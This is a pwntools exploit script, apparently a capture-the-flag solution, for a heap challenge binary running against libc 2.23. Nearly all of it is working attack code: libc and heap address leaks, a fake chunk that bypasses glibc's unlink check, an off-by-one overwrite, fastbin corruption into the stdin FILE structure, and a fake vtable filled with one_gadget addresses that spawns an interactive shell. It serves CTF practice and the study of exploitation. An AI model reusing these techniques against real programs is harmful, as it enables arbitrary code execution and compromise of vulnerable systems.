#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './pwn1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc-2.23.so')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = []
pie = 1
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)


def eat():
    p.recvuntil('> ')

def add(size, con):
    eat()
    p.sendline('1')
    p.recvuntil('size:\n')
    p.sendline(str(size))
    p.recvuntil('content:\n')
    p.send(con)

def dele(idx):
    eat()
    p.sendline('2')
    p.recvuntil('index:\n')
    p.sendline(str(idx))

def show(idx):
    eat()
    p.sendline('3')
    p.recvuntil('index:\n')
    p.sendline(str(idx))

def edit(addr):
    eat()
    p.sendline('4')
    p.recvuntil('addr:\n')
    p.sendline(str(addr))


add(0x90, 'a'*1)# 0
add(0x10, 'a'*1)# 1

dele(0)

add(0x90, '\n')# 0

show(0)
libc.address = u64(p.recv(6).ljust(8, b"\x00"))-0x3c4b0a
log.success("libc.address: "+hex(libc.address))

add(0x10, 'a')# 2
dele(1)
dele(2)

add(0x10, '\n')# 1
show(1)
heapbase = u64(p.recv(6).ljust(8, b"\x00"))-0x100a
log.success("heapbase: "+hex(heapbase))
add(0x10, 'a')# 2

ptr = heapbase + 0x1120
heap_addr = heapbase + 0x10f0

fake_chunk = p64(0)+p64(0xb1)+p64(ptr-0x18)+p64(ptr-0x10)+p64(heap_addr+0x10) # bypass unlink check
add(0x40, fake_chunk)# 3 fake_chunk
add(0x68, '1')# 4 off-by-one
add(0xf0, '1')# 5 free
add(0x10, '1')# 6 bypass top

dele(4)

add(0x68, b'\x00'*0x60 + p64(0xb0))# 4 off-by-one

dele(5)# unlink

add(0x60, '\n')# 5 改写后面的 chunk


dele(4)

dele(5)

# _IO_file_jumps = libc.sym['_IO_file_jumps']
# log.success("_IO_file_jumps: "+hex(_IO_file_jumps))
_IO_2_1_stdin_ = libc.sym['_IO_2_1_stdin_']
log.success("_IO_2_1_stdin_: "+hex(_IO_2_1_stdin_))
fake_chunk = _IO_2_1_stdin_ + 160 - 0x3 #* 0x7ffff7dd1970
log.success("fake_chunk: "+hex(fake_chunk))
one_array = [0x45216,0x4526a,0xf02a4,0xf1147]
one_gadget = libc.address + one_array[2]

add(0x60, p64(0)*7+p64(0x71)+p64(fake_chunk))# 5 改写后面的 chunk

add(0xa8,p64(0)*2+p64(one_gadget)*19) # fake vtable
fake_vtable_addr = heapbase+0x11e0+0x10

payload = b'\x00'*3+flat(0,0,0xffffffff,0,0,fake_vtable_addr)#* 从 0x7ffff7dd1980 开始写 其余值维持不变即可
add(0x60,'\n')
debug()
add(0x63,payload)# scanf -> underflow

p.interactive()